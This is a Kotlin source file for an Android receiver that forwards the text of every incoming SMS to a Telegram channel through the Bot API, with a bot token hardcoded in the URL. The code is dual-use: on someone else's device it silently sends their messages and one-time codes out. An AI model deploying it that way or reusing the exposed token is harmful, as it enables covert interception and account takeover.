package com.example.smslistner

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import okhttp3.*
import java.io.IOException
import java.net.URLEncoder

class SmsReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context?, intent: Intent?) {
        if (intent?.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            val smsMessages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            smsMessages.forEach { message ->
                val messageText = message.messageBody
                sendToTelegram(messageText)
            }
        }
    }

    private fun sendToTelegram(message: String) {
        val client = OkHttpClient()
        val encodedMessage = URLEncoder.encode(message, "UTF-8")
        val url = "https://api.telegram.org/bot6950283126:AAEIQisYlUz6fgo26kFz4SDrL9WKImwdEQM/sendMessage?chat_id=@mysmsinmyphone&text=$encodedMessage"

        val request = Request.Builder()
            .url(url)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                e.printStackTrace()
            }

            override fun onResponse(call: Call, response: Response) {
                try {
                    if (!response.isSuccessful) throw IOException("Unexpected code $response")
                    // Here you might want to handle the response
                    println(response.body?.string())
                } finally {
                    response.body?.close()
                }
            }
        })
    }
}
